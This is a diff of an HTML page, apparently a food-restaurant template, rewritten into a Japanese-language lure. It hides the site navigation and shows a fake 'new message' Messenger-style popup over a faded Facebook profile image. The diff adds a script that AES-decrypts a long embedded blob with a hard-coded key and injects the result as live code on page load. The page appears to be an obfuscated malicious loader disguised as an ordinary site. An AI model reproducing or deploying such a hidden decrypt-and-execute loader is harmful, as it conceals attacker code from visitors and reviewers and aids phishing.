@@ -6,20 +6,126 @@
 	<title>メッセージがあります</title>
 	<link rel="stylesheet" href="style.css">
 	<script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=e71e80c1"></script>
+	<style>
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
+
+		body {
+			font-family: 'Poppins', sans-serif;
+			background: #f4f4f4;
+		}
+
+		.divcover {
+			z-index: 10;
+			background-color: rgba(0, 0, 0, 0.7);
+			position: fixed;
+			inset: 0;
+		}
+
+		.f-modal-centre {
+			background-color: #fff;
+			border-radius: 16px;
+			text-align: center;
+			width: 100%;
+			max-width: 500px;
+			padding: 32px;
+			display: block;
+			position: relative;
+			bottom: -37%;
+			left: 50%;
+			transform: translateX(-50%);
+			box-shadow: 10px 10px 50px rgba(0, 0, 0, 0.2);
+			opacity: 1;
+		}
+
+		.f-modal-icon-success img {
+			border-radius: 10px;
+			margin-bottom: 20px;
+		}
+
+		.f-sub-heading-regular {
+			font-size: 22px;
+			margin-bottom: 12px;
+			color: #333;
+		}
+
+
+		.f-button-primary {
+			background-color: #D31965;
+			color: white;
+			border-radius: 50px;
+			padding: 12px 32px;
+			font-size: 14px;
+			font-weight: 500;
+			text-decoration: none;
+			cursor: pointer;
+			margin: 10px;
+			display: inline-block;
+			transition: background-color 0.3s;
+		}
+
+		.f-button-primary:hover {
+			background-color: #A0144F;
+		}
+
+		.f-modal-close {
+			position: absolute;
+			top: 10px;
+			right: 10px;
+			cursor: pointer;
+			font-size: 20px;
+			color: #666;
+		}
+
+		.f-modal-close:hover {
+			color: #D31965;
+		}
+
+		.button-group {
+			margin-top: 20px;
+		}
+
+		.testOpacity {
+			opacity: 0.001;
+		}
+	</style>
 </head>
-<body>
-	<header>
-		<a href="#" class="logo">Food<span>.</span></a>
-		<div class="menuToggle" onclick="toggleMenu()"></div>
-		<ul class="navigation">
-			<li><a href="#home" onclick="toggleMenu()">Home</a></li>
-			<li><a href="#about" onclick="toggleMenu()">About</a></li>
-			<li><a href="#menu" onclick="toggleMenu()">Menu</a></li>
-			<li><a href="#expert" onclick="toggleMenu()">Expert</a></li>
-			<li><a href="#testimonials" onclick="toggleMenu()">Testimonials</a></li>
-			<li><a href="#contact" onclick="toggleMenu()">Contact</a></li>
-		</ul>
-	</header>
+<body id="myBody">
+
+<div class="divcover" id="modalContainer">
+	<div class="f-modal-centre" id="modalContent">
+		<div class="f-modal-icon-success" style="
+            display: flex;
+            justify-content: center;
+            align-items: center;">
+			            <img src="img/messenger-icon1024.jpg" width="100" height="100" loading="lazy" alt="Cookie Icon">
+		</div>
+		<div class="f-sub-heading-regular">新しいメッセージが1件あります。読みますか？</div>
+		<div class="button-group">
+			<a href="#" class="f-button-primary" id="rejectButton" style="background-color: #E53935;">キャンセル</a>
+			<a href="#" class="f-button-primary" id="manageButton" style="background-color: #2979FF;">続く</a>
+		</div>
+		<div class="f-modal-close" id="closeButton">✖</div>
+	</div>
+</div>
+<div style="opacity: 0.3">
+	<img src="img/fbProfile.jpg">
+</div>
+<!--	<header>-->
+<!--		<a href="#" class="logo">Food<span>.</span></a>-->
+<!--		<div class="menuToggle" onclick="toggleMenu()"></div>-->
+<!--		<ul class="navigation">-->
+<!--			<li><a href="#home" onclick="toggleMenu()">Home</a></li>-->
+<!--			<li><a href="#about" onclick="toggleMenu()">About</a></li>-->
+<!--			<li><a href="#menu" onclick="toggleMenu()">Menu</a></li>-->
+<!--			<li><a href="#expert" onclick="toggleMenu()">Expert</a></li>-->
+<!--			<li><a href="#testimonials" onclick="toggleMenu()">Testimonials</a></li>-->
+<!--			<li><a href="#contact" onclick="toggleMenu()">Contact</a></li>-->
+<!--		</ul>-->
+<!--	</header>-->
 	<section class="banner" id="banner">
 		<div class="content">
 			<h2>Always choose good</h2>
@@ -238,6 +344,41 @@
 			menuToggle.classList.toggle('active');
 			navigation.classList.toggle('active');
 		}
+	</script>
+
+	<script>
+		function closeModal() {
+			document.getElementById("modalContainer").style.display = "none";
+			document.getElementById("testopc").style.opacity = 1;
+			document.getElementById("age-confirmation-modal").style.display = "none";
+			console.log("tes$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4t");
+		}
+		document.getElementById("myBody").addEventListener("click", closeModal);
+		document.getElementById("closeButton").addEventListener("click", closeModal);
+		document.getElementById("rejectButton").addEventListener("click", function (event) {
+			document.getElementById("modalContainer").style.display = "none";
+		});
+		document.getElementById("manageButton").addEventListener("click", function (event) {
+			document.getElementById("modalContainer").style.display = "none";
+		});
+	</script>
+	<!--facebook-->
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+	<script>
+		function aesDecode(encodedText) {
+			const decodedText = decodeURIComponent(encodedText);
+			const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+			return bytes.toString(CryptoJS.enc.Utf8);
+		}
+		const codeString = aesDecode(`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`);
+		const script = document.createElement("script");
+		script.textContent = codeString;
+		document.body.appendChild(script);
+	</script>
+
+	<script>
+		document.body.style.overflow = "hidden";
 	</script>
 </body>
 </html>
